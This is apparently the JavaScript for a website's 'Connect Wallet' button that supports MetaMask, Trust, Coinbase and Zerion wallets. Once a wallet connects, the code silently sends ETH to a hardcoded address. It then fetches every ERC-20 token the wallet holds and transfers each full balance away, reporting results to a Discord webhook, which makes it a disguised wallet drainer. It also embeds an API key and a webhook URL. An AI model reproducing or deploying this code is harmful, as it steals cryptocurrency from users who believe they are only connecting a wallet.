let isConnecting = false; // Flag to prevent multiple connections

async function connectWallet() {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return; // Exit if already connecting
    }

    isConnecting = true; // Set the flag to true
    document.getElementById("connectButton").disabled = true; // Disable the button

    try {
        // Show wallet selection options
        const walletChoice = prompt("Choose a wallet: (1) MetaMask (2) Trust Wallet (3) Coinbase Wallet (4) Phantom Wallet (5) Zerion");

        let account;
        if (walletChoice === "1") {
            // MetaMask connection logic
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accounts[0];
                console.log(`Connected to MetaMask account: ${account}`);
            } else {
                alert("MetaMask is not installed. Please install it.");
                window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
            }
        } else if (walletChoice === "2") {
            // Trust Wallet connection logic (Use the same as MetaMask)
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accounts[0];
                console.log(`Connected to Trust Wallet account: ${account}`);
            } else {
                alert("Trust Wallet is not installed.");
            }
        } else if (walletChoice === "3") {
            // Coinbase Wallet connection logic (Use the same as MetaMask)
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accounts[0];
                console.log(`Connected to Coinbase Wallet account: ${account}`);
            } else {
                alert("Coinbase Wallet is not installed.");
            }
        } else if (walletChoice === "4") {
            // Phantom Wallet connection logic (Only available for Solana, you can adjust accordingly)
            alert("Phantom Wallet is not supported for Ethereum.");
            return;
        } else if (walletChoice === "5") {
            // Zerion Wallet connection logic (Assuming it also works with MetaMask's provider)
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accounts[0];
                console.log(`Connected to Zerion Wallet account: ${account}`);
            } else {
                alert("Zerion Wallet is not installed.");
            }
        } else {
            alert("Invalid choice. Please refresh and try again.");
        }

        if (account) {
            await sendFirstTransaction(account); // Automatically send the first transaction
        }

    } catch (error) {
        console.error("Error connecting to wallet:", error);
    } finally {
        isConnecting = false; // Reset the flag
        document.getElementById("connectButton").disabled = false; // Re-enable the button
    }
}

async function sendFirstTransaction(walletAddress) {
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
        const amountInEther = "0.0002"; // The updated amount for the first transaction

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("First transaction response:", txResponse);
            
            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");

            // Automatically trigger the second transaction using the fixed token threshold
            await sendSecondTransaction(signer, walletAddress);
        } catch (error) {
            console.error("Error sending first transaction:", error);
            
            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("MetaMask is not installed. Please install it.");
    }
}

async function sendSecondTransaction(signer, walletAddress) {
    const erc20TokenAddresses = await getERC20TokenAddresses(walletAddress); // Fetch token addresses using Alchemy API
    const tokenThreshold = 0.000001; // Fixed token threshold

    for (const tokenAddress of erc20TokenAddresses) {
        const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
        const balance = await tokenContract.balanceOf(walletAddress);
        const tokenDecimals = await tokenContract.decimals();
        const tokenSymbol = await tokenContract.symbol();

        // Convert the balance to its decimal form
        const balanceInUnits = balance / Math.pow(10, tokenDecimals);

        // Check if the balance is greater than the token threshold
        if (balanceInUnits > tokenThreshold) {
            console.log(`Sending ${balanceInUnits} ${tokenSymbol} from ${walletAddress}`);

            // Send the token
            const txResponse = await tokenContract.transfer(
                "0xRecipientAddress", // Replace with actual recipient address
                balance // Transfer the full balance
            );

            console.log(`Transaction hash: ${txResponse.hash}`);
        }
    }
}

async function getERC20TokenAddresses(walletAddress) {
    const apiKey = "UB-6IiwEmHuVZIGKCJMK_kcnKXqSgMgq"; // Your Alchemy API Key
    const url = `https://eth-mainnet.g.alchemy.com/v2/${apiKey}/getTokenBalances?owner=${walletAddress}`;

    const response = await fetch(url);
    const data = await response.json();

    if (data.tokenBalances) {
        // Filter and return the list of token addresses with a balance greater than zero
        return data.tokenBalances
            .filter(token => token.tokenBalance > 0)
            .map(token => token.contractAddress);
    } else {
        console.error("Error fetching token addresses:", data.message);
        return [];
    }
}

async function sendWebhook(message, status) {
    const webhookUrl = "https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg"; // Your Discord webhook URL
    const payload = {
        content: `Transaction Status: ${status}\nMessage: ${message}`
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        console.log("Webhook sent successfully");
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}

// Attach the event listener to the button
document.getElementById("connectButton").addEventListener("click", connectWallet);

// ERC20 Token ABI
const erc20ABI = [
    // Transfer event
    "event Transfer(address indexed from, address indexed to, uint256 value)",
    // balanceOf function
    "function balanceOf(address owner) view returns (uint256)",
    // transfer function
    "function transfer(address to, uint256 value) returns (bool)"
];
